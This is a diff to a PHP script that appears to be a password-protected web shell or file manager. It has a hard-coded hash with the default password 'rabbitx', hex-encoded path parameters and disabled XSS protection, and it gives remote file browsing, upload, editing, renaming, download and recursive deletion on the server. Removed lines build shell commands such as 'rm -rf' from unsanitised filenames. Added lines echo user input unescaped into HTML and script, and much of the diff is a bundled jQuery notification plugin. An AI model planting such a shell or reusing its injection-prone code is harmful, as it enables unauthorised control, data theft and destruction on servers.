@@ -1,4 +1,9 @@
 <?php
+// Login
+// https://codepen.io/j9159573241/pen/rNNvZRy
+header("X-XSS-Protection: 0");
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
 date_default_timezone_set("Asia/Jakarta");
 class auth
 {
@@ -22,6 +27,7 @@ class auth
 
 	public function displayLogin()
 	{
+		// https://codepen.io/linux/pen/jYMOBe
 		?>
 		<form method='post'>
 			<input type='password'name='pass'>
@@ -34,7 +40,7 @@ class auth
 		if(isset($this->password) && (trim($this->password) != '')){
 			if(isset($this->post['pass'])){
 				if (password_verify($this->post["pass"], $this->password)) {
-					setcookie("pass", $this->password, time() + $this->expired[3], "/");
+					setcookie("pass", $this->password, time() + $this->expired[4], "/");
 					header("Location: {$_SERVER['PHP_SELF']}");
 				}
 			}
@@ -106,7 +112,7 @@ class listFiles
 	public function list($type)
 	{
 		$this->result= [];
-		foreach (scandir($this->path()) as $key => $value) {
+		foreach (@scandir($this->path()) as $key => $value) {
 			$filename = [
 				"getPathname"	=> $this->path() . DIRECTORY_SEPARATOR . $value,
 				"getName"		=> $value,
@@ -408,14 +414,14 @@ class listFiles
 	* @param: dir
 	* @param: array
 	*/
-	public function listAll($dir, &$output = array())
+	public static function listAll($dir, &$output = array())
 	{
 		foreach (scandir($dir) as $key => $value) {
 			$location = $dir.DIRECTORY_SEPARATOR.$value;
 			if (!is_dir($location)) {
 				$output[] = $location;
 			} elseif ($value != "." && $value != '..') {
-				$this->listAll($location, $output);
+				self::listAll($location, $output);
 				$output[] = $location;
 			}
 		} return $output;
@@ -652,26 +658,9 @@ class Action extends Tools
 		return false;
 	}
 
-	public function download($url = null, $filename = null)
+	public function downloadFileUrl($url, $filename)
 	{
-		if (!$this->validUrl($url)) {
-			$this->filename = trim($this->filename);
-			if (is_file($this->filename)) {
-				header("Content-Type: application/octet-stream");
-				header('Content-Transfer-Encoding: binary');
-				header("Content-length: ".filesize($this->filename));
-				header("Cache-Control: no-cache");
-				header("Pragma: no-cache");
-				header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");
-				while (!feof($this->handle)) {
-					print(fread($this->handle, 1024*8));
-					@ob_flush();
-					@flush();
-				}
-				fclose($this->handle);
-				die();
-			}
-		} else {
+		if ($this->validUrl($url)) {
 			$get = [
 				$url,
 				$filename
@@ -693,17 +682,479 @@ class Action extends Tools
 		}
 	}
 
-	public function delete()
+	public function downloadFile()
 	{
-		if (is_dir($this->filename)) {
-			if (!@rmdir($this->filename) AND $this->isWIN()) $this->execute("rmdir {$this->filename} /s /q");
-			if (!@rmdir($this->filename) AND $this->isWIN()) $this->execute("rm -rf {$this->filename}");
-		} elseif (is_file($this->filename)) {
-			if (!@unlink($this->filename) AND $this->isWIN()) $this->execute("del /f {$this->filename}");
-			if (!@unlink($this->filename) AND $this->isWIN()) $this->execute("rm {$this->filename}");
+		$this->filename = trim($this->filename);
+			if (is_file($this->filename)) {
+				@header("Content-Type: application/octet-stream");
+				@header('Content-Transfer-Encoding: binary');
+				@header("Content-length: ".filesize($this->filename));
+				@header("Cache-Control: no-cache");
+				@header("Pragma: no-cache");
+				@header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");
+				while (!feof($this->handle)) {
+					print(fread($this->handle, 1024*8));
+					@ob_flush();
+					@flush();
+				}
+				fclose($this->handle);
+				die();
+			}
+	}
+
+	public function delete($filename)
+	{
+		if (is_dir($filename)) {
+			foreach (scandir($filename) as $key => $value) {
+				if ($value != "." && $value != "..") {
+					if (is_dir($filename)) {
+						$this->delete($filename . DIRECTORY_SEPARATOR . $value);
+					} else {
+						@unlink($filename . DIRECTORY_SEPARATOR . $value);
+					}
+				}
+			}
+			if (@rmdir($filename)) {
+				return true;
+			} else {
+				return false;
+			}
+		} else {
+			if (@unlink($filename)) {
+				return true;
+			} else {
+				return false;
+			}
 		}
 	}
 }
+
+function alert($msg, bool $bool = true)
+{
+	?>
+	<script src="https://code.jquery.com/jquery-3.0.0.min.js"></script>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+	<script src="https://www.jqueryscript.net/demo/Simple-Flexible-jQuery-Alert-Notification-Plugin-notify-js/js/prettify.js"></script>
+	<style type="text/css">
+		.notify{
+			position: fixed;
+			width: 400px;
+			padding: 15px;
+			z-index: 9999;
+			border-radius: 4px;
+			-webkit-border-radius: 4px;
+			-webkit-transition: all .4s ease-in-out;
+			-moz-transition: all .4s ease-in-out;
+			-o-transition: all .4s ease-in-out;
+			transition: all .4s ease-in-out;
+		}
+		.notify > button.close{
+			position: absolute;
+			top: 8px;
+			right: 12px;
+			-webkit-appearance: none;
+			padding: 0;
+			cursor: pointer;
+			background: 0 0;
+			border: 0;
+			float: right;
+			font-size: 23px;
+			font-weight: 700;
+			line-height: 1;
+			color: #000;
+			text-shadow: 0 1px 0 #fff;
+			filter: alpha(opacity=20);
+			opacity: .2;
+			outline: none;
+		}
+		.notify > button.close:hover{
+			filter: alpha(opacity=50);
+			opacity: .5;
+		}
+		.notify-dismissible .message{
+			padding-right: 25px;
+		}
+
+		/** animation type **/
+		.notify.scale{
+			-webkit-transform: scale(0.8);
+			-moz-transform: scale(0.8);
+			-o-transform: scale(0.8);
+			transform: scale(0.8);
+			opacity: 0;
+		}
+		.notify.left.drop{
+			-webkit-transform: translateX(-50%);
+			-moz-transform: translateX(-50%);
+			-o-transform: translateX(-50%);
+			transform: translateX(-50%);
+			opacity: 0;
+		}
+		.notify.center.drop{
+			-webkit-transform: translateY(-120%);
+			-moz-transform: translateY(-120%);
+			-o-transform: translateY(-120%);
+			transform: translateY(-120%);
+			opacity: 0;
+		}
+		.notify.right.drop{
+			-webkit-transform: translateX(50%);
+			-moz-transform: translateX(50%);
+			-o-transform: translateX(50%);
+			transform: translateX(50%);
+			opacity: 0;
+		}
+		.notify.middle.center.drop{
+			-webkit-transform: translateY(-20%);
+			-moz-transform: translateY(-20%);
+			-o-transform: translateY(-20%);
+			transform: translateY(-20%);
+			opacity: 0;
+		}
+		.notify.bottom.center.drop{
+			-webkit-transform: translateY(120%);
+			-moz-transform: translateY(120%);
+			-o-transform: translateY(120%);
+			transform: translateY(120%);
+			opacity: 0;
+		}
+		.notify.fade{
+			opacity: 0;
+		}
+		.notify.out{
+			opacity: 0;
+		}
+
+		/** notify type **/
+		.notify-default{
+			background-color: #fff;
+			color: #333;
+			box-shadow: 0 3px 10px rgba(0,0,0,.2);
+			-webkit-box-shadow: 0 3px 10px rgba(0,0,0,.2);
+		}
+		.notify-info{
+			color: #31708f;
+			background-color: #d9edf7;
+		}
+		.notify-toast{
+			color: #fff;
+			background-color: rgba(0,0,0,0.75);
+		}
+		.notify-danger{
+			color: #a94442;
+			background-color: #f2dede;
+		}
+		.notify-warning{
+			color: #8a6d3b;
+			background-color: #fcf8e3;
+		}
+		.notify-success{
+			color: #3c763d;
+			background-color: #dff0d8;
+		}
+
+		/** position **/
+		.notify.top{
+			top: 15px;
+		}
+		.notify.middle{
+			top: 50%;
+		}
+		.notify.bottom{
+			bottom: 15px;
+		}
+		.notify.left{
+			left: 15px;
+		}
+		.notify.center{
+			left: 50%;
+			margin-left: -200px;
+		}
+		.notify.right{
+			right: 15px;
+		}
+
+		/** buttons **/
+		.notify-buttons{
+			width: 100%;
+			margin-top: 10px;
+		}
+		.notify-buttons.left{
+			text-align: left;
+		}
+		.notify-buttons.center{
+			text-align: center;
+		}
+		.notify-buttons.right{
+			text-align: right;
+		}
+		.notify-buttons > button{
+			border: 1px solid #ddd;
+			padding: 4px 10px;
+			background: #fff;
+			color: #333;
+			cursor: pointer;
+			outline: none;
+		}
+		.notify-buttons > button:hover{
+			background: #eee;
+		}
+		.notify-buttons > button:first-child{
+			margin-right: 5px;
+		}
+
+		/** util **/
+		.notify-backdrop{
+			width: 100%;
+			height: 100%;
+			position: fixed;
+			top: 0;
+			left: 0;
+			bottom: 0;
+			right: 0;
+			z-index: 9998;
+			background-color: #000;
+			opacity: 0;
+			-webkit-transition: opacity .4s ease-in-out;
+			-moz-transition: opacity .4s ease-in-out;
+			-o-transition: opacity .4s ease-in-out;
+			transition: opacity .4s ease-in-out;
+		}
+		body.notify-open{
+			overflow: hidden;
+		}
+		body.notify-open-drop{
+			overflow-x: hidden;
+		}
+
+		@media all and (max-width:768px){
+			.notify{
+				width: 100%;
+				left: 0!important;
+				margin: 0!important;
+				border-radius: 0;
+				-webkit-border-radius: 0;
+			}
+			.notify.top{
+				top: 0!important;
+			}
+			.notify.bottom{
+				bottom: 0!important;
+			}
+			.notify.middle{
+				width: 80%!important;
+				margin-left: 10%!important;
+				border-radius: 4px;
+				-webkit-border-radius: 4px;
+			}
+			.notify.left.drop, .notify.right.drop{
+				-webkit-transform: translateY(-120%);
+				-moz-transform: translateY(-120%);
+				-o-transform: translateY(-120%);
+				transform: translateY(-120%);
+			}
+			.notify.bottom.drop{
+				-webkit-transform: translateY(120%);
+				-moz-transform: translateY(120%);
+				-o-transform: translateY(120%);
+				transform: translateY(120%);
+				opacity: 0;
+			}
+		}
+	</style>
+	<script type="text/javascript">
+		if (typeof jQuery === 'undefined') {
+			throw new Error('JavaScript requires jQuery')
+		}
+
+		+function ($) {
+			'use strict';
+			var version = $.fn.jquery.split(' ')[0].split('.')
+			if ((version[0] < 2 && version[1] < 9) || (version[0] == 1 && version[1] == 9 && version[2] < 1)) {
+				throw new Error('JavaScript requires jQuery version 1.9.1 or higher')
+			}
+		}(jQuery);
+
+		+function ($) {
+
+			$.notify = function(message, options) {
+				var config = $.extend(
+					{
+						delay: 3000,
+						type: "default",
+						align: "center",
+						verticalAlign: "top",
+						blur: 0.2,
+						close: false,
+						background: "",
+						color: "",
+						class: "",
+						animation: true,
+						animationType: "drop",
+						icon: "",
+						buttons: [],
+						buttonFunc: [],
+						buttonAlign: "center",
+						width: "600px"
+					},
+					options
+				);
+
+				var animation = "";
+				var buttons = "";
+				var close = "";
+				var closeClass = "";
+				var icon = "";
+
+				if(config.animation) { 
+					animation = config.animationType;  
+				} if(config.icon != "") { 
+					icon = "<i class='icon fa fa-"+config.icon+"'></i>"; 
+				} if(config.close || config.delay == 0) { 
+					close = "<button type='button' class='close' data-close='notify' data-animation='"+animation+"'; ><span class='material-icons'>cancel</span></button>";
+					closeClass = "notify-dismissible"; 
+				}
+				/*if(config.buttons.length != 0){
+					buttons = "<div class='notify-buttons "+config.buttonAlign+"'>";
+					if(config.buttonFunc.length != 0){
+						if(typeof config.buttonFunc[0] != "undefined"){
+							buttons += "<button type='button' onclick='"+config.buttonFunc[0]+"()'>"+config.buttons[0]+"</button>";
+						}
+						if(typeof config.buttonFunc[1] != "undefined"){
+							buttons += "<button type='button' onclick='"+config.buttonFunc[1]+"()'>"+config.buttons[1]+"</button>";
+						}else{
+							if(typeof config.buttons[1] != "undefined"){ buttons += "<button type='button'>"+config.buttons[1]+"</button>"; }
+						}
+					}else{
+						buttons += "<button type='button'>"+config.buttons[0]+"</button>";
+						if(typeof config.buttons[1] != "undefined"){ buttons += "<button type='button'>"+config.buttons[1]+"</button>"; }
+						
+					}
+					buttons += "</div>";
+				}*/
+
+		var $elem = $("<div data-animation='"+animation+"' class='notify "+config.align+" "+ config.verticalAlign+" "+animation+" "+closeClass+"'><div class='message'>"+icon+message+"</div>"+buttons+close+"</div>");
+		if(config.background != "") { 
+			$elem.css("background", config.background);
+		} else {
+			if(config.class == "") {
+				$elem.addClass("notify-"+config.type);
+			} else {
+				$elem.addClass(config.class);
+			}
+		}
+		if(config.color != "") { 
+			$elem.css("color", config.color); 
+		} if(animation == "drop") { 
+			$("body").addClass("notify-open-drop"); 
+		} if(config.verticalAlign == "middle") {
+			$elem.css("visibility", "hidden");
+			$("body").append($elem);
+			$elem.css(
+				{
+					"margin-top":$elem.innerHeight()/2*-1,
+					"visibility":"visible"
+				}
+			);
+		} else {
+			$("body").append($elem);
+		}
+		
+		if(config.animation){
+			setTimeout(function(){
+				$elem.removeClass(animation);
+			},100);
+		}
+
+		if(config.delay == 0) {
+			var $backdrop = $("<div class='notify-backdrop'></div>");
+			$("body").append($backdrop).addClass("notify-open");
+			setTimeout(function() {
+				$backdrop.css("opacity", config.blur);
+			}, 100);
+		} else {
+			setTimeout(function(){
+				if(config.animation){
+					$elem.addClass(config.animationType);
+					setTimeout(function(){
+						if(config.animation == "drop"){ 
+							$("body").removeClass("notify-open-drop"); 
+						} $elem.remove();
+					}, 400);
+				} else {
+					$elem.remove();
+				}
+			}, config.delay);
+		}
+	}
+
+	$(document).on("click", ".notify-backdrop", function(e){
+		hide($(".notify"));
+	});
+	$(document).on("click", ".notify-buttons > button", function(e){
+		hide($(this).parent().parent());
+	});
+	$(document).on("click", "[data-close='notify']", function(e){
+		hide($(this).parent());
+	});
+
+	function hide($el){
+		$("body").removeClass("notify-open");
+		$(".notify-backdrop").css("opacity",0);
+		if($el.data("animation") != "") {
+			$el.addClass($el.data("animation"));
+			setTimeout(function(){
+				$("body").removeClass("notify-open-drop");
+				$(".notify-backdrop").remove();
+				$el.remove();
+			},400);
+		} else {
+			$(".notify-backdrop").remove();
+			$el.remove();
+		}
+	}
+}(jQuery);
+
+	</script>
+	<?php
+	if ($bool === true) { ?>
+		<script type="text/javascript">
+			$.notify(
+				"<?= $msg ?>",
+				{
+					blur: 0.4,
+					delay: 0,
+					align: "right",
+					verticalAlign: "top",
+					close: true,
+					color: "green",
+					background: "#b0f7bc"
+				}
+			);
+		</script>
+	<?php } elseif ($bool === false) { ?>
+		<script type="text/javascript">
+			$.notify(
+				"<?= $msg ?>",
+				{
+					blur: 0.4,
+					delay: 0,
+					align: "right",
+					verticalAlign: "top",
+					close: true,
+					color: "red",
+					background: "#e08787"
+				}
+			);
+		</script>
+	<?php }
+}
+
+// Auth
+
+$auth = new Auth('$2y$10$KT7Odax4IsjI7o1JN.iEge/s1q7yiqiG.qoONaRfaDveelqG2A8YO'); // default: (rabbitx)
+$auth->login();
+
 if (isset($_GET['x'])) {
 	cd::cd(hex::toString($_GET['x']));
 }
@@ -716,7 +1167,7 @@ $Tools = new Tools;
 	<link href="https://fonts.googleapis.com/css?family=Inter:400,800,900&display=swap" rel="stylesheet">
 	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-icons/3.0.1/iconfont/material-icons.min.css">
 	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-
+	<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 </head>
 <style type="text/css">
 	@import url("https://fonts.googleapis.com/css?family=Roboto&display=swap");
@@ -1145,11 +1596,21 @@ $Tools = new Tools;
 			width: 100%;
 			float: none;
 		}
+		.size, .perm, .time {
+			width:auto;
+		}
 	}
 
 </style>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script type="text/javascript">
+	// Clicktable
+	jQuery(document).ready(function($) {
+		$(".clickable").click(function() {
+			window.location = $(this).data("href");
+		});
+	});
+	// end Clicktable
 	// Menu Dropdown
 	$(function() {
 		$('.dropdown-toggle').click(function() 
@@ -1183,7 +1644,6 @@ $Tools = new Tools;
 		});
 	});
 	// end Action Dropdown
-
 </script>
 <div class="grid">
 	<div class="nav">
@@ -1198,17 +1658,17 @@ $Tools = new Tools;
 						</a>
 					</li>
 					<li>
-						<a href="#">
+						<a href="?x=<?= hex::toHex(getcwd()) ?>&t=<?= hex::toHex("upload") ?>">
 							<span class="actions material-icons">cloud_upload</span> Upload
 						</a>
 					</li>
 					<li>
-						<a href="#">
-								<span class="actions material-icons">create_new_folder</span> New Folder
+						<a href="?x=<?= hex::toHex(getcwd()) ?>&t=<?= hex::toHex("newdir") ?>">
+							<span class="actions material-icons">create_new_folder</span> New Folder
 						</a>
 					</li>
 					<li>
-						<a href="#">
+						<a href="?x=<?= hex::toHex(getcwd()) ?>&t=<?= hex::toHex("newfile") ?>">
 							<span class="actions material-icons">filter_none</span> New File
 						</a>
 					</li>
@@ -1222,26 +1682,175 @@ $Tools = new Tools;
 	<div class="clear"></div>
 	<div class="bungkus">
 		<?php
+		// Tools
+		switch (@$_GET['t']) {
+			// Upload File
+			case hex::toHex("upload"):
+				print("Upload");
+				die();
+				break;
+			// end Upload File
+
+			// New File
+			case hex::toHex("newfile"):
+				$Tools = new Tools;
+				if (isset($_POST['submit'])) {
+					if (!$Tools->make([$_POST['filename']])->path(getcwd())->file($_POST['data'])) {
+						alert("file <b>".str_replace("|", ", ", $_POST['filename'])."</b> created !", true);
+					} else {
+						alert("error !", false);
+					}
+				}
+				?>
+				<div class="col-100">
+					<div class="block gutter">
+						<table width="100%">
+							<form method="post">
+								<tr>
+									<td>
+										<input type="text" name="filename" placeholder="file.html">
+									</td>
+								</tr>
+								<tr>
+									<td>
+										<textarea name="data"></textarea>
+									</td>
+								</tr>
+								<tr>
+									<td>
+										<input type="submit" name="submit">
+									</td>
+								</tr>
+							</form>
+						</table>
+					</div>
+				</div>
+				<?php
+				die();
+				break;
+			// end New File
+
+			// New Folder
+			case hex::toHex("newdir"):
+				$Tools = new Tools;
+				if (isset($_POST['submit'])) {
+					if ($Tools->make($_POST['filename'])->path(getcwd())->dir()) {
+						alert("folder <b>{$_POST['filename']}</b> created !", true);
+					} else {
+						alert("error !", false);
+					}
+				}
+				?>
+				<div class="col-100">
+					<div class="block gutter">
+						<table width="100%">
+							<form method="post">
+								<tr>
+									<td>
+										<input type="text" name="filename" placeholder="folder">
+									</td>
+									<td>
+										<input type="submit" name="submit">
+									</td>
+								</tr>
+							</form>
+						</table>
+					</div>
+				</div>
+				<?php
+				die();
+				break;
+			// end New Folder
+		}
+		// end Tools
+
+
+		// Rename File
+		if (isset($_GET['c'])) {
+			$file = hex::toString($_GET['c']);
+			$Action = new Action($file);
+			if (isset($_POST['submit'])) {
+				if ($Action->chname($_POST['newname'])) {
+					print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
+				} else {
+					alert("failed");
+				}
+			}
+			?>
+			<div class="col-100">
+				<div class="block gutter">
+					<table width="100%">
+						<tr>
+							<td>Filename</td>
+							<td>:</td>
+							<td><?= $listFiles->wr($file, basename($file)) ?></td>
+						</tr>
+						<tr>
+							<?php
+							if (is_dir($file)) { ?>
+								<td>In dir</td>
+								<td>:</td>
+								<td><?= $listFiles->countDir($file) ?></td>
+							<?php } else { ?>
+								<td>Size</td>
+								<td>:</td>
+								<td><?= $listFiles->formatSIze(filesize($file)) ?></td>
+							<?php }
+							?>
+						</tr>
+						<tr>
+							<td>Last Modified</td>
+							<td>:</td>
+							<td><?= $listFiles->ftime($file) ?></td>
+						</tr>
+						<form method="post">
+							<tr>
+								<td colspan="2">
+									<input type="text" name="newname" value="<?= basename($file) ?>">
+								</td>
+								<td>
+									<input type="submit" name="submit" value="Change">
+								</td>
+							</tr>
+						</form>
+					</table>
+				</div>
+			</div>
+			<?php
+			die();
+		}
+		// end Rename File
+
+		// Download File
+		if (isset($_GET['d'])) {
+			$file = hex::toString($_GET['d']);
+			$Action = new Action(basename($file));
+			$Action->open("readmaster")->downloadFile();
+		}
+		// end Download File
+
+		// Delete File/Folder
 		if (isset($_GET['r'])) {
 			$file = hex::toString($_GET['r']);
 			$Action = new Action($file);
-			var_dump($Action->delete());
-			// if ($Action->delete()) {
-			// 	print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
-			// } else {
-			// 	print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
-			// }
+			if ($Action->delete($file)) {
+				print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
+			} else {
+				print('<meta http-equiv="refresh" content="0;url=?x='.hex::toHex(getcwd()).'">');
+			}
 			die();
 		}
+		// end Delete File/Folder
+
 		// Edit Page
 		if (isset($_GET['e'])) {
 			$file = hex::toString($_GET['e']);
 			$Action = new Action($file);
 			if (isset($_POST['submit'])) {
 				if ($Action->open("write")->write($_POST['data'])) {
-					print("success");
+					alert("success", true);
 				} else {
-					print("failed");
+					alert("failed", false);
 				}
 			}
 			?>
@@ -1282,12 +1891,13 @@ $Tools = new Tools;
 			<?php
 			die();
 		}
+		// end Edit Page
 		foreach ($listFiles->folders() as $key => $value) { ?>
 			<div>
-				<div class="col-75">
+				<div class="col-75 clickable" data-href="?x=<?= hex::toHex($value["getPathname"]) ?>">
 					<div class="block gutter">
 						<img class="icon" src="<?= $listFiles->getIcon($value["getPathname"]) ?>">
-						<a href="?x=<?= hex::toHex($value["getPathname"]) ?>"><?= $value["getName"] ?></a>
+						<?= $value["getName"] ?>
 						<br>
 						<div class="info size"><?= $value["getSize"] ?></div>
 						<div class="info perm"><?= $value["getPerm"] ?></div>
@@ -1299,7 +1909,7 @@ $Tools = new Tools;
 						<i class="action-toggle material-icons menu">pending</i>
 						<ul class="action">
 							<li>
-								<a href="#">
+								<a href="?x=<?= hex::toHex(getcwd()) ?>&c=<?= hex::toHex($value["getPathname"]) ?>">
 									<span class="actions"><i class="material-icons">drive_file_rename_outline</i></span>
 									 Rename
 								</a>
@@ -1339,7 +1949,7 @@ $Tools = new Tools;
 							</a>
 						</li>
 						<li>
-							<a href="#">
+							<a href="?x=<?= hex::toHex(getcwd()) ?>&c=<?= hex::toHex($value["getPathname"]) ?>">
 								<span class="actions">
 									<i class="material-icons">drive_file_rename_outline</i> 
 								</span>
@@ -1355,7 +1965,7 @@ $Tools = new Tools;
 							</a>
 						</li>
 						<li>
-							<a href="#">
+							<a href="#downloadFile">
 								<span class="actions">
 									<i class="material-icons">file_download</i>
 								</span>
